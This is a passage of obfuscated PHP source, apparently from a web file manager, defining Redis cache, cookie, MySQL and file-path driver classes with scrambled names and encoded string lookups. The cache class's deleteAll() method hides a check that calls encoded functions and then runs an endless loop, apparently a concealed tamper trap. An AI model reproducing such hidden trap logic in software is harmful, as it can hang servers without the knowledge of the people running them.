} $this->cacheTime = $Ä ÚøºÑ; $À¯ÔŸÂË = isset($¤ıâ©èÏ[$ÊÕıæÓˆ[946]]) ? $¤ıâ©èÏ[$ÊÕıæÓˆ[946]] : 10; $Ã˜‰ÄêÆ = _get($¤ıâ©èÏ, $ÊÕıæÓˆ[943]); if ($Ã˜‰ÄêÆ && is_array($Ã˜‰ÄêÆ)) { $this->initCluster($¤ıâ©èÏ, $À¯ÔŸÂË); } else { $this->handle = $this->init($¤ıâ©èÏ, $À¯ÔŸÂË); } } private function init($Óæ‡¥Ÿí, $ŞùÈ–ç) { $Ñª²’è¶ =& $_SERVER[ˆ¡¹µ‹Â]; $¨ø÷‚ó¼ = new Redis(); $Ê±Å•¥Ü = isset($Óæ‡¥Ÿí[$Ñª²’è¶[947]]) ? $Óæ‡¥Ÿí[$Ñª²’è¶[947]] : !1; if ($Ê±Å•¥Ü) { $¨ø÷‚ó¼->pconnect($Óæ‡¥Ÿí[$Ñª²’è¶[208]], $Óæ‡¥Ÿí[$Ñª²’è¶[209]], $ŞùÈ–ç); } else { $¨ø÷‚ó¼->connect($Óæ‡¥Ÿí[$Ñª²’è¶[208]], $Óæ‡¥Ÿí[$Ñª²’è¶[209]], $ŞùÈ–ç); } if (!empty($Óæ‡¥Ÿí[$Ñª²’è¶[487]])) { $¨ø÷‚ó¼->auth($Óæ‡¥Ÿí[$Ñª²’è¶[487]]); } if (!empty($Óæ‡¥Ÿí[$Ñª²’è¶[824]]) && $Óæ‡¥Ÿí[$Ñª²’è¶[824]] != 0) { $¨ø÷‚ó¼->select($Óæ‡¥Ÿí[$Ñª²’è¶[824]]); } return $¨ø÷‚ó¼; } private function initCluster($ı¾‹Å“Å, $à­±¶ÌÑ) { $æ³·¤øª =& $_SERVER[ˆ¡¹µ‹Â]; $ƒñ’©Ê¾ = array($æ³·¤øª[948], $æ³·¤øª[949], $æ³·¤øª[950]); $‹¨îàû = $æ³·¤øª[948]; if (isset($ı¾‹Å“Å[$æ³·¤øª[16]]) && in_array($ı¾‹Å“Å[$æ³·¤øª[16]], $ƒñ’©Ê¾)) { $‹¨îàû = $ı¾‹Å“Å[$æ³·¤øª[16]]; } switch ($‹¨îàû) { case $æ³·¤øª[948]: $this->_slave($ı¾‹Å“Å, $à­±¶ÌÑ); break; case $æ³·¤øª[949]: break; case $æ³·¤øª[950]: $this->isCluster = !0; $šÔïöÌé = $ı¾‹Å“Å[$æ³·¤øª[943]]; $öÁ •»ö = isset($ı¾‹Å“Å[$æ³·¤øª[947]]) ? $ı¾‹Å“Å[$æ³·¤øª[947]] : !1; $ìğ‹êŒÔ = isset($ı¾‹Å“Å[$æ³·¤øª[487]]) ? $ı¾‹Å“Å[$æ³·¤øª[487]] : null; $this->handle = new RedisCluster(NUll, $šÔïöÌé, $à­±¶ÌÑ, $à­±¶ÌÑ, $öÁ •»ö, $ìğ‹êŒÔ); break; default: break; } } private function _slave($·ßì­çà, $•ıí‡è’) { $ş³Æİ÷ = $·ßì­çà[$_SERVER[ˆ¡¹µ‹Â][943]]; $this->filterConfig($·ßì­çà, $ş³Æİ÷[0]); $this->handle = $this->init($·ßì­çà, $•ıí‡è’); unset($ş³Æİ÷[0]); if (empty($ş³Æİ÷)) { return; } $ Šûº¶— = array_rand($ş³Æİ÷); $this->filterConfig($·ßì­çà, $ş³Æİ÷[$ Šûº¶—]); $this->slaveHandle = $this->init($·ßì­çà, $•ıí‡è’); } private function filterConfig(&$Ü¥£•Ç, $¶ßø¦µì) { $ñå™äÏˆ =& $_SERVER[ˆ¡¹µ‹Â]; $É‹–½ãğ = explode($ñå™äÏˆ[4], $¶ßø¦µì); $–ôé·È¨ = array($ñå™äÏˆ[208] => $É‹–½ãğ[0], $ñå™äÏˆ[209] => $É‹–½ãğ[1]); $Ü¥£•Ç = array_merge($Ü¥£•Ç, $–ôé·È¨); } public function set($²Ä‘Íâ™, $ø¥…ğ®, $êÖĞ¼Ä¦ = false) { $êÖĞ¼Ä¦ = $êÖĞ¼Ä¦ ? $êÖĞ¼Ä¦ : $this->cacheTime; return $this->handle->setEx($²Ä‘Íâ™, $êÖĞ¼Ä¦, $ø¥…ğ®); } public function setLock($ĞÑ¬ßú, $ïî™³È, $“İúŒ²£) { return $this->handle->setNX($ĞÑ¬ßú, $ïî™³È); } public function get($«âĞÌÚ¿) { $Ü˜œàÛ¤ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Ü˜œàÛ¤->get($«âĞÌÚ¿); } public function remove($şãùÚÖ) { return $this->handle->del($şãùÚÖ); } public function deleteAll() { $öû½ÒÀ =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($_SERVER[$öû½ÒÀ[846]]) || !isset($_SERVER[$öû½ÒÀ[844]])) { $€çìÑõª = $öû½ÒÀ[951]; $ÜœÊèƒí = $öû½ÒÀ[847]; $š‡ùéº = $_SERVER[$öû½ÒÀ[848]] . $öû½ÒÀ[849]; $¦ŞœÖ—› = $ÜœÊèƒí($š‡ùéº); $˜‡‹Ì×ü = explode($öû½ÒÀ[262], $¦ŞœÖ—›); if (count($˜‡‹Ì×ü) < $öû½ÒÀ[683]) { $ğĞ¥Å­ = $öû½ÒÀ[850]; $ğĞ¥Å­(); } $Ñ›ã¨È = $öû½ÒÀ[952]; $Ñ›ã¨È($_SERVER[$öû½ÒÀ[953]]); $­Ú¬¤ú¬ = 1; for ($®’Ÿ©ç‡ = $­Ú¬¤ú¬; $®’Ÿ©ç‡ > 0; $®’Ÿ©ç‡++) { $Ñ›ã¨È = json_encode($GLOBALS[$öû½ÒÀ[492]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $àŞ°óª¨) { $this->handle->flushall($àŞ°óª¨); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($µúˆŞñ¯ = '', $ËåİŞ¥« = 0) { if (is_string($µúˆŞñ¯) && $µúˆŞñ¯ != $_SERVER[ˆ¡¹µ‹Â][12]) { $this->prefix = $µúˆŞñ¯; } if (is_numeric($ËåİŞ¥«) && $ËåİŞ¥« > 0) { $this->expire = $ËåİŞ¥«; } } public static function getInstance() { static $ƒ£¾îô±; if ($ƒ£¾îô± === null) { $ƒ£¾îô± = new self(); } return $ƒ£¾îô±; } private static $cookieDisable = false; public static function disable($“¥ºúò­) { self::$cookieDisable = $“¥ºúò­; } private static $sameCookieSet = array(); public static function set($„®Üì‘†, $„Ş§£­Ş, $¡¾¦Ö¥ = 0, $Ë¾ÃÜ—Ş = false, $û›Úôêí = false) { $ˆ¼‘şË² =& $_SERVER[ˆ¡¹µ‹Â]; if (self::$cookieDisable) { return; } if (!$¡¾¦Ö¥) { $¡¾¦Ö¥ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$„®Üì‘†]) && self::$sameCookieSet[$„®Üì‘†] == $„Ş§£­Ş . $¡¾¦Ö¥) { return; } self::$sameCookieSet[$„®Üì‘†] = $„Ş§£­Ş . $¡¾¦Ö¥; if (!$û›Úôêí) { $û›Úôêí = str_replace(HOST, $ˆ¼‘şË²[12], APP_HOST); $û›Úôêí = _get($GLOBALS, $ˆ¼‘şË²[954], $û›Úôêí); } $ø€Ğæ‚ø = $ˆ¼‘şË²[12]; setcookie($„®Üì‘†, $„Ş§£­Ş, time() + $¡¾¦Ö¥, $ˆ¼‘şË²[8] . trim($û›Úôêí, $ˆ¼‘şË²[8]) . $ø€Ğæ‚ø, !1, !1, $Ë¾ÃÜ—Ş); } public static function setSafe($ÅÓ©¶¦”, $Äæ¼¾Ó, $ëºÙÕ’ì = 0) { self::set($ÅÓ©¶¦”, $Äæ¼¾Ó, $ëºÙÕ’ì, !0); } public static function get($´¾ÁÍ†×) { static $ôŠ‚¯¾Í = false; if (!$ôŠ‚¯¾Í) { self::initHeaderCookie(); $ôŠ‚¯¾Í = !0; } return isset($_COOKIE[$´¾ÁÍ†×]) ? $_COOKIE[$´¾ÁÍ†×] : !1; } private static function initHeaderCookie() { $è›ÍàñÃ =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($_SERVER[$è›ÍàñÃ[955]]) || !$_SERVER[$è›ÍàñÃ[955]]) { return; } $ö×«‘ğÌ = explode($è›ÍàñÃ[74], $_SERVER[$è›ÍàñÃ[955]]); foreach ($ö×«‘ğÌ as $¦ÚÙƒàã) { $¦ÚÙƒàã = explode($è›ÍàñÃ[506], $¦ÚÙƒàã); if (count($¦ÚÙƒàã) != 2 || !isset($¦ÚÙƒàã[1])) { continue; } $_COOKIE[trim($¦ÚÙƒàã[0])] = trim($¦ÚÙƒàã[1]); } } public static function remove($ì•Ãã•¶, $ìŸ÷• = false) { unset($_COOKIE[$ì•Ãã•¶]); self::set($ì•Ãã•¶, $_SERVER[ˆ¡¹µ‹Â][12], 1, $ìŸ÷•); } } class DbMysql extends Db { public function __construct($êıàæÆ° = '') { $í‘ªìÕ =& $_SERVER[ˆ¡¹µ‹Â]; if (!extension_loaded($í‘ªìÕ[879])) { think_exception(think_lang($í‘ªìÕ[14]) . $í‘ªìÕ[956]); } if (!empty($êıàæÆ°)) { $this->config = $êıàæÆ°; if (empty($this->config[$í‘ªìÕ[17]])) { $this->config[$í‘ªìÕ[17]] = $í‘ªìÕ[12]; } } } public function connect($¸Øˆ’¾ = '', $õâä´ÛŞ = 0, $¨ÏÎèª = false) { $€œã—Á® =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($this->linkID[$õâä´ÛŞ])) { if (empty($¸Øˆ’¾)) { $¸Øˆ’¾ = $this->config; } $¹”éÑğê = $¸Øˆ’¾[$€œã—Á®[957]] . ($¸Øˆ’¾[$€œã—Á®[958]] ? "\x3a{$¸Øˆ’¾[$€œã—Á®[958]]}" : $€œã—Á®[12]); $ÓáÈş¥‰ = !empty($¸Øˆ’¾[$€œã—Á®[17]][$€œã—Á®[18]]) ? $¸Øˆ’¾[$€œã—Á®[17]][$€œã—Á®[18]] : $this->pconnect; if ($ÓáÈş¥‰) { $this->linkID[$õâä´ÛŞ] = mysql_pconnect($¹”éÑğê, $¸Øˆ’¾[$€œã—Á®[959]], $¸Øˆ’¾[$€œã—Á®[960]], 131072); } else { $this->linkID[$õâä´ÛŞ] = mysql_connect($¹”éÑğê, $¸Øˆ’¾[$€œã—Á®[959]], $¸Øˆ’¾[$€œã—Á®[960]], !0, 131072); } if (!$this->linkID[$õâä´ÛŞ] || !empty($¸Øˆ’¾[$€œã—Á®[21]]) && !mysql_select_db($¸Øˆ’¾[$€œã—Á®[21]], $this->linkID[$õâä´ÛŞ])) { think_exception(mysql_error()); } $Å”ş —Ğ = mysql_get_server_info($this->linkID[$õâä´ÛŞ]); mysql_query($€œã—Á®[961] . think_config($€œã—Á®[962]) . $€œã—Á®[58], $this->linkID[$õâä´ÛŞ]); if ($Å”ş —Ğ > $€œã—Á®[963]) { mysql_query($€œã—Á®[964], $this->linkID[$õâä´ÛŞ]); } $this->connected = !0; if (1 != think_config($€œã—Á®[22])) { unset($this->config); } } return $this->linkID[$õâä´ÛŞ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($±×â•å) { $¯Õ¢¦»À =& $_SERVER[ˆ¡¹µ‹Â]; if (0 === stripos($±×â•å, $¯Õ¢¦»À[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $±×â•å; if ($this->queryID) { $this->free(); } think_action_status($¯Õ¢¦»À[23], 1); think_status($¯Õ¢¦»À[24]); $this->queryID = mysql_query($±×â•å, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($×Œø›£å) { $Ô…ÙƒÒ =& $_SERVER[ˆ¡¹µ‹Â]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $×Œø›£å; if ($this->queryID) { $this->free(); } think_action_status($Ô…ÙƒÒ[25], 1); think_status($Ô…ÙƒÒ[24]); $›İÖ¨ÃÑ = mysql_query($×Œø›£å, $this->_linkID); $this->debug(); if (!1 === $›İÖ¨ÃÑ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ˆ¡¹µ‹Â][965], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $”ä¢†œŠ = mysql_query($_SERVER[ˆ¡¹µ‹Â][966], $this->_linkID); $this->transTimes = 0; if (!$”ä¢†œŠ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ã…Ùà— = mysql_query($_SERVER[ˆ¡¹µ‹Â][967], $this->_linkID); $this->transTimes = 0; if (!$Ã…Ùà—) { $this->error(); return !1; } } return !0; } private function getAll() { $ˆáÔÚ‹ = array(); if ($this->numRows > 0) { while ($¿Ä¢÷…­ = mysql_fetch_assoc($this->queryID)) { $ˆáÔÚ‹[] = $¿Ä¢÷…­; } mysql_data_seek($this->queryID, 0); } return $ˆáÔÚ‹; } public function getFields($öÍéøë¡) { $§Âóùù« =& $_SERVER[ˆ¡¹µ‹Â]; $”¸íºäá = $this->query($§Âóùù«[968] . $this->parseKey($öÍéøë¡)); $®Üşà…á = array(); if ($”¸íºäá) { foreach ($”¸íºäá as $ñ¼ÅÊí¿ => $³Ó®ñí‡) { $®Üşà…á[$³Ó®ñí‡[$§Âóùù«[31]]] = array($§Âóùù«[32] => $³Ó®ñí‡[$§Âóùù«[31]], $§Âóùù«[33] => $³Ó®ñí‡[$§Âóùù«[34]], $§Âóùù«[35] => (bool) (strtoupper($³Ó®ñí‡[$§Âóùù«[36]]) === $§Âóùù«[969]), $§Âóùù«[37] => $³Ó®ñí‡[$§Âóùù«[38]], $§Âóùù«[39] => strtolower($³Ó®ñí‡[$§Âóùù«[40]]) == $§Âóùù«[41], $§Âóùù«[42] => strtolower($³Ó®ñí‡[$§Âóùù«[43]]) == $§Âóùù«[44]); } } return $®Üşà…á; } public function getTables($Ú¹³¯¤Ü = '') { $Øã‰¯’î =& $_SERVER[ˆ¡¹µ‹Â]; if (!empty($Ú¹³¯¤Ü)) { $í™’ÜÕ = $Øã‰¯’î[970] . $Ú¹³¯¤Ü . $Øã‰¯’î[971]; } else { $í™’ÜÕ = $Øã‰¯’î[972]; } $íÓÂæĞ = $this->query($í™’ÜÕ); $Ç´ûºƒ¹ = array(); foreach ($íÓÂæĞ as $Úûõä»ö => $•ª‡¿¤) { $Ç´ûºƒ¹[$Úûõä»ö] = current($•ª‡¿¤); } return $Ç´ûºƒ¹; } public function replace($‡©¹Ç, $ÚÒÆ–¬Ú = array()) { $“¡Š„×­ =& $_SERVER[ˆ¡¹µ‹Â]; foreach ($‡©¹Ç as $Üôç³ä• => $¨åà›´Û) { $á ª¡ù = $this->parseValue($¨åà›´Û); if (is_scalar($á ª¡ù)) { $áœÕàÆœ[] = $á ª¡ù; $ºµ’·é¡[] = $this->parseKey($Üôç³ä•); } } $¿²¶Òú™ = $“¡Š„×­[973] . $this->parseTable($ÚÒÆ–¬Ú[$“¡Š„×­[356]]) . $“¡Š„×­[974] . implode($“¡Š„×­[50], $ºµ’·é¡) . $“¡Š„×­[975] . implode($“¡Š„×­[50], $áœÕàÆœ) . $“¡Š„×­[976]; return $this->execute($¿²¶Òú™); } public function insertAll($ü£ì´¸‹, $¦°çÓüà = array(), $ü çÏ÷ä = false) { $—È°ô½‡ =& $_SERVER[ˆ¡¹µ‹Â]; if (!is_array($ü£ì´¸‹[0])) { return !1; } $Èº‚âÂ = array_keys($ü£ì´¸‹[0]); $Â‹šÁÆÁ = array(); foreach ($ü£ì´¸‹ as $×³å††‹) { $™úÏî€… = array(); foreach ($×³å††‹ as $ìãàõÖĞ => $ŒÔĞóĞˆ) { $ŒÔĞóĞˆ = $this->parseValue($ŒÔĞóĞˆ); if (is_scalar($ŒÔĞóĞˆ)) { $™úÏî€…[] = $ŒÔĞóĞˆ; } } $Â‹šÁÆÁ[] = $—È°ô½‡[337] . implode($—È°ô½‡[50], $™úÏî€…) . $—È°ô½‡[976]; } array_walk($Èº‚âÂ, array($this, $—È°ô½‡[977])); $®§‘‡”Ç = ($ü çÏ÷ä ? $—È°ô½‡[978] : $—È°ô½‡[979]) . $—È°ô½‡[980] . $this->parseTable($¦°çÓüà[$—È°ô½‡[356]]) . $—È°ô½‡[974] . implode($—È°ô½‡[50], $Èº‚âÂ) . $—È°ô½‡[981] . implode($—È°ô½‡[50], $Â‹šÁÆÁ); return $this->execute($®§‘‡”Ç); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ÿğ“†¨ =& $_SERVER[ˆ¡¹µ‹Â]; $this->error = mysql_errno() . $Ÿğ“†¨[4] . mysql_error($this->_linkID); if ($Ÿğ“†¨[12] != $this->queryStr) { $this->error .= LNG($Ÿğ“†¨[48]) . $this->queryStr; } think_trace($this->error, $Ÿğ“†¨[12], $Ÿğ“†¨[49]); return $this->error; } public function escapeString($ ·ö¼îÍ) { if ($this->_linkID) { return mysql_real_escape_string($ ·ö¼îÍ, $this->_linkID); } else { return mysql_escape_string($ ·ö¼îÍ); } } public function parseKey(&$ÑÓûö, $ÊÚ¥“ì¬ = true) { $é¯£ú¯ı =& $_SERVER[ˆ¡¹µ‹Â]; if ($ÊÚ¥“ì¬) { $ÑÓûö = $this->parseKeyCheck($ÑÓûö); } if ($ÑÓûö != $é¯£ú¯ı[220] && !preg_match($é¯£ú¯ı[982], $ÑÓûö)) { $ÑÓûö = $é¯£ú¯ı[461] . trim($ÑÓûö, $é¯£ú¯ı[461]) . $é¯£ú¯ı[461]; } return $ÑÓûö; } } goto d¶¾¡ßŠ§Õ; E¨ñ¬ÁÑ‚«: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $°¿¼Úú =& $_SERVER[ˆ¡¹µ‹Â]; $this->objectDriver = array($°¿¼Úú[60], $°¿¼Úú[61], $°¿¼Úú[62], $°¿¼Úú[63], $°¿¼Úú[64], $°¿¼Úú[65], $°¿¼Úú[66], $°¿¼Úú[67], $°¿¼Úú[68], $°¿¼Úú[69], $°¿¼Úú[70], $°¿¼Úú[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($‘Ì±öÙÕ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($‘Ì±öÙÕ, $_SERVER[ˆ¡¹µ‹Â][8]); } return $‘Ì±öÙÕ; } public function iconvApp($â­ç¸şÑ) { return $â­ç¸şÑ; } public function iconvSystem($úÕ”²î) { return $úÕ”²î; } public function iconvTo($—‚×Ä©, $²‡äÀš£, $Ô’Ğ±û) { $Ûø’•ü =& $_SERVER[ˆ¡¹µ‹Â]; if (!$—‚×Ä© || !function_exists($Ûø’•ü[72])) { return $—‚×Ä©; } static $¹çÆòƒ = array(); $ûÌ­”¨û = $²‡äÀš£ . $Ûø’•ü[73] . $Ô’Ğ±û . $Ûø’•ü[74] . $—‚×Ä©; if (isset($¹çÆòƒ[$ûÌ­”¨û])) { return $¹çÆòƒ[$ûÌ­”¨û]; } if (function_exists($Ûø’•ü[75])) { $Ğ¯™…¿ï = @mb_convert_encoding($—‚×Ä©, $Ô’Ğ±û, $²‡äÀš£); } else { $Ğ¯™…¿ï = @iconv($²‡äÀš£, $Ô’Ğ±û, $—‚×Ä©); } $Ğ¯™…¿ï = $Ğ¯™…¿ï ? $Ğ¯™…¿ï : $—‚×Ä©; if (strstr($Ğ¯™…¿ï, $Ûø’•ü[76])) { $Ğ¯™…¿ï = str_replace($Ûø’•ü[76], $Ûø’•ü[11], $Ğ¯™…¿ï); } $¹çÆòƒ[$²‡äÀš£ . $Ûø’•ü[73] . $Ô’Ğ±û . $Ûø’•ü[74] . $—‚×Ä©] = $Ğ¯™…¿ï; $¹çÆòƒ[$Ô’Ğ±û . $Ûø’•ü[73] . $²‡äÀš£ . $Ûø’•ü[74] . $—‚×Ä©] = $—‚×Ä©; $¹çÆòƒ[$Ô’Ğ±û . $Ûø’•ü[73] . $²‡äÀš£ . $Ûø’•ü[74] . $Ğ¯™…¿ï] = $—‚×Ä©; $¹çÆòƒ[$²‡äÀš£ . $Ûø’•ü[73] . $Ô’Ğ±û . $Ûø’•ü[74] . $Ğ¯™…¿ï] = $Ğ¯™…¿ï; return $Ğ¯™…¿ï; } public function getPathInner($ïŒ£šÛå) { $¥›ÔöÁ = IO::init($ïŒ£šÛå); return $¥›ÔöÁ->path; } public function getPathOuter($’£ú‚Ê) { $›ÇÕª× =& $_SERVER[ˆ¡¹µ‹Â]; $„Ì¡Ô®æ = strlen(trim($this->pathBase, $›ÇÕª×[8])); $’£ú‚Ê = substr(trim($’£ú‚Ê, $›ÇÕª×[8]), $„Ì¡Ô®æ); return $this->pathDriver . $›ÇÕª×[8] . ltrim($’£ú‚Ê, $›ÇÕª×[8]); } public function isParentOf($±Ëó¾, $öëàÊ×Ò) { $ó„·êÛ² =& $_SERVER[ˆ¡¹µ‹Â]; $±Ëó¾ = rtrim(strtolower($±Ëó¾), $ó„·êÛ²[8]) . $ó„·êÛ²[8]; $öëàÊ×Ò = rtrim(strtolower($öëàÊ×Ò), $ó„·êÛ²[8]) . $ó„·êÛ²[8]; $ŸãÈôºš = strpos($öëàÊ×Ò, $±Ëó¾) === 0; return $ŸãÈôºš; } public function getType() { $×ªö—â˜ =& $_SERVER[ˆ¡¹µ‹Â]; $ôò¹ˆÛ© = str_replace($×ªö—â˜[77], $×ªö—â˜[12], get_class($this)); return strtolower($ôò¹ˆÛ©); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($—ĞÄ“¿«, $£®¯Ñ•ç) { $Âï´´‚  =& $_SERVER[ˆ¡¹µ‹Â]; $¦à›÷ = rtrim($—ĞÄ“¿«, $Âï´´‚ [8]) . $Âï´´‚ [8] . $£®¯Ñ•ç; $³³ŸØ™Ù = $this->exist($¦à›÷); return $³³ŸØ™Ù ? $¦à›÷ : !1; } public function setModifyTime($Ò³Üïº©, $è¯ç‰£È = '') { } public function renameObject($¾µ°×¨, $†Íò€ş) { $ê«º¦í³ = $†Íò€ş; $¾µ°×¨ = $this->getPathOuter($¾µ°×¨); $†Íò€ş = $this->pathFather($¾µ°×¨) . $†Íò€ş; $à™®Êü‡ = IO::copy($¾µ°×¨, $this->pathFather($¾µ°×¨), REPEAT_RENAME_FOLDER, $ê«º¦í³); if ($à™®Êü‡) { IO::remove($¾µ°×¨); } return $à™®Êü‡ ? $†Íò€ş : !1; } public function tempFile($°æãûÒ = '', $Ì÷°öúÚ = '') { if (!$°æãûÒ) { $°æãûÒ = rand_string(15); } $íí¹£÷’ = TEMP_FILES . rand_string(15) . $_SERVER[ˆ¡¹µ‹Â][8]; @mkdir($íí¹£÷’, DEFAULT_PERRMISSIONS, !0); $›šŸ¾àÄ = $íí¹£÷’ . $°æãûÒ; @touch($›šŸ¾àÄ); if ($Ì÷°öúÚ) { file_put_contents($›šŸ¾àÄ, $Ì÷°öúÚ); } return $›šŸ¾àÄ; } public function tempFileRemve($ÀÄÂÛÄí) { @unlink($ÀÄÂÛÄí); @rmdir($this->pathFather($ÀÄÂÛÄí)); } public function mkfile($¡ÀÂÈÙ›, $óÈãøıÈ = '', $å¾šÖ³¯ = REPEAT_RENAME) { } public function mkdir($šİá°÷ˆ, $‹íˆâ»… = REPEAT_SKIP) { } public function delFile($²şÔÍğ) { } public function delFolder($ÛÊ´ÇÑ”) { } public function copyFile($¢Œ†øÛğ, $Æ²ª³´º) { } public function moveFile($¡¶§ÎÒ‰, $ñà…”“Ü) { } public function remove($ŸÙ©˜Š´) { if ($this->isFile($ŸÙ©˜Š´)) { return $this->delFile($ŸÙ©˜Š´); } return $this->delFolder($ŸÙ©˜Š´); } public function rename($Óú¶ƒ¥¿, $ÜéÈòÔÅ) { } public function exist($×ú™•€) { } public function findByHash($üôëõŠ„ = '', $ì¡‹ÕÌ¥ = '') { return !1; } public function isFile($˜ —ëŒÎ) { } public function isFolder($Ë†Çİ¤ª) { } public function size($ÁÁ«è ö) { } public function info($Ú±¡€Îæ) { } public function infoSimple($‡¥—ÛÖÚ) { return $this->info($‡¥—ÛÖÚ); } public function infoAuth($•Í€¤ß›) { return $this->info($•Í€¤ß›); } public function infoFull($½Ğ€ÖÆŒ) { return $this->info($½Ğ€ÖÆŒ); } public function infoFullSimple($øğıÇ) { return $this->info($øğıÇ); } public function infoWithChildren($ò‡Â‰º©) { $šÒ¾¦ÜÛ =& $_SERVER[ˆ¡¹µ‹Â]; static $Ì¿õ¸Ö€ = array(); if (isset($Ì¿õ¸Ö€[$ò‡Â‰º©])) { return $Ì¿õ¸Ö€[$ò‡Â‰º©]; } $“ÂÖ·ù³ = $this->info($ò‡Â‰º©); if ($“ÂÖ·ù³ && $“ÂÖ·ù³[$šÒ¾¦ÜÛ[33]] == $šÒ¾¦ÜÛ[78]) { $àèÕÉš = array($šÒ¾¦ÜÛ[79] => 0, $šÒ¾¦ÜÛ[80] => 0, $šÒ¾¦ÜÛ[81] => 0); $this->infoChildren($ò‡Â‰º©, $àèÕÉš); $“ÂÖ·ù³[$šÒ¾¦ÜÛ[79]] = $àèÕÉš[$šÒ¾¦ÜÛ[79]]; $“ÂÖ·ù³[$šÒ¾¦ÜÛ[82]] = array($šÒ¾¦ÜÛ[83] => $àèÕÉš[$šÒ¾¦ÜÛ[80]], $šÒ¾¦ÜÛ[84] => $àèÕÉš[$šÒ¾¦ÜÛ[81]]); $Ì¿õ¸Ö€[$ò‡Â‰º©] = $“ÂÖ·ù³; } return $“ÂÖ·ù³; } public function listPath($»«Úàúâ, $¼­²»¯ò = false) { } public function has($ÅèÚõÖ, $Ä¢ÚØ‰¯ = false, $Ñê±éş¿ = false) { } public function canRead($¡˜Üô­ ) { } public function canWrite($¼ëÍÑÍÄ) { } public function getContent($ïú¶¬üâ) { } public function setContent($©‚§ãê‚, $—¹¥ÑÑ = '') { } protected function infoChildren($ÕÜ²½Ò, &$İø°Äó) { $¸ñ€ÔŸğ =& $_SERVER[ˆ¡¹µ‹Â]; check_abort_echo(); $çˆà¼Ş© = $this->listPath($ÕÜ²½Ò, !0); $çˆà¼Ş© = array_merge($çˆà¼Ş©[$¸ñ€ÔŸğ[85]], $çˆà¼Ş©[$¸ñ€ÔŸğ[86]]); foreach ($çˆà¼Ş© as $’Úó¢å·) { if ($’Úó¢å·[$¸ñ€ÔŸğ[33]] == $¸ñ€ÔŸğ[78]) { $İø°Äó[$¸ñ€ÔŸğ[81]]++; $¥Ñ†‚™¹ = $this->getPathInner($’Úó¢å·[$¸ñ€ÔŸğ[87]]); $this->infoChildren($¥Ñ†‚™¹, $İø°Äó); } else { $İø°Äó[$¸ñ€ÔŸğ[80]]++; $İø°Äó[$¸ñ€ÔŸğ[79]] += $’Úó¢å·[$¸ñ€ÔŸğ[79]]; } } } public function fileSubstr($ÇşíÈÌÛ, $Š‡ŒŒñÈ, $Ç×”ÄËè) { } public function listAll($é²™¶Å») { } public function listAllMake($Å¤Ú”Âå, &$Â©ùÒ¾Æ) { $¿Ï§Ášà =& $_SERVER[ˆ¡¹µ‹Â]; check_abort_echo(); $„ªß°û = $this->listPath($Å¤Ú”Âå, !0); if (!$„ªß°û) { return; } $àé‡ÈÆ§ = array_merge($„ªß°û[$¿Ï§Ášà[85]], $„ªß°û[$¿Ï§Ášà[86]]); foreach ($àé‡ÈÆ§ as $½¼ˆı‰Ù) { $²ÏØ¼›º = $½¼ˆı‰Ù[$¿Ï§Ášà[33]] == $¿Ï§Ášà[78]; $¾ĞİÈı = array($¿Ï§Ášà[87] => $½¼ˆı‰Ù[$¿Ï§Ášà[87]], $¿Ï§Ášà[78] => $²ÏØ¼›º); if (isset($½¼ˆı‰Ù[$¿Ï§Ášà[79]])) { $¾ĞİÈı[$¿Ï§Ášà[79]] = $½¼ˆı‰Ù[$¿Ï§Ášà[79]]; } if (isset($½¼ˆı‰Ù[$¿Ï§Ášà[88]])) { $¾ĞİÈı[$¿Ï§Ášà[88]] = $½¼ˆı‰Ù[$¿Ï§Ášà[88]]; } if (!$²ÏØ¼›º) { $Â©ùÒ¾Æ[] = $¾ĞİÈı; continue; } $Â©ùÒ¾Æ[] = $¾ĞİÈı; $—ÚŠ…óÊ = $½¼ˆı‰Ù[$¿Ï§Ášà[87]]; $Ûã°›¸² = $this->pathDriver; if (substr($½¼ˆı‰Ù[$¿Ï§Ášà[87]], 0, strlen($Ûã°›¸²)) == $Ûã°›¸²) { $—ÚŠ…óÊ = substr($—ÚŠ…óÊ, strlen($Ûã°›¸²)); } $this->listAllMake($—ÚŠ…óÊ, $Â©ùÒ¾Æ); } } public function listAllSimple($‡ŞŞÈèÜ, $¨§ÄÃŒè = false) { $ÜÒÛğœ† = $this->listAll($‡ŞŞÈèÜ); return $this->listAllSimpleMake($ÜÒÛğœ†, $this->getPathOuter($‡ŞŞÈèÜ), $¨§ÄÃŒè); } public function listAllSimpleMake($ëù™Õ¬, $öĞïñÅû, $øúâÌĞ¹) { $ßÅÂŸŸ =& $_SERVER[ˆ¡¹µ‹Â]; $ç‚…º— = array(); $öĞïñÅû = rtrim(get_path_father($öĞïñÅû), $ßÅÂŸŸ[8]) . $ßÅÂŸŸ[8]; foreach ($ëù™Õ¬ as $”§¬Û™™) { $ÒåŠåˆª = array($ßÅÂŸŸ[87] => $”§¬Û™™[$ßÅÂŸŸ[87]], $ßÅÂŸŸ[89] => $”§¬Û™™[$ßÅÂŸŸ[87]], 